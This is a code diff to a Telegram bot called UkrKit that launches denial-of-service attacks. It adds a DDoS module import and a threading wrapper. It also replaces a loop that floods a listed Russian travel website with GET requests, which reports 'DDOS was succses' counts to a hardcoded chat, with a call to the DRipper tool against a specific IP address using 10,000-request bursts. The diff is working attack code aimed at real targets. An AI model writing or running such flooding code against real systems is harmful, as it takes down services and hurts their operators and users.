@@ -1,5 +1,11 @@
 from telegram.ext import Updater, MessageHandler, Filters, CallbackQueryHandler,  CommandHandler
-import os, requests, time
+import os, requests, time, threading, socket
+from DDos import checkUrl, DDos
+
+class Thread:
+    def __init__(self, func = None, arg =None):
+        self.t = threading.Thread(target=func, args=arg)
+        self.t.start()
 
 class UkrKit(object):
     _instance = None
@@ -11,7 +17,7 @@ class UkrKit(object):
 
     def __init__(self):
         self.updater = Updater(os.getenv("TOKEN"), use_context=True)
-        self.SvynogoriaServices = ["https://anex-tour.ru/"]
+        self.SvynogoriaServices = ["https://www.google.com/"]
         self.CountSvynogoriaServices = 0
         self.dispatcher = self.updater.dispatcher
         self.chat_id = 0
@@ -35,19 +41,24 @@ class UkrKit(object):
         kit.AttackSvynogoria()
 
     def AttackSvynogoria(self):
-        num = 0
-        last_num = 50
-        while True:
-            try:
-                req = requests.get(self.SvynogoriaServices[0])
-                print(req)
-                num += 1
-                print(num)
-                print(self.chat_id)
-                if last_num + 50 < num:
-                    last_num = num
-                    if self.chat_id != 0:
-                        self.dispatcher.bot.send_message("397362619", "DDOS was succses by {0} req".format(num))
-            except: pass
+        #num = 0
+        #last_num = 50
+        #fail_num = 0
 
+        #while True:
+        os.system("python DRipper.py -s 194.54.14.131 -p 80 -t 443 -q 10000")
+
+        #while True:
+        #    try:
+                #req = Thread(requests.get, (self.SvynogoriaServices[0]))
+        #        r=requests.get(self.SvynogoriaServices[0])
+        #        print(r)
+        #        num += 1
+         #       print(num)
+        #        print(fail_num)
+        #        if last_num + 50 < num:
+         #           last_num = num
+         #           if self.chat_id != 0:
+         #               self.dispatcher.bot.send_message("397362619", "DDOS was succses by {0} requests".format(num))
+         #   except: fail_num+=1
 UkrKit()
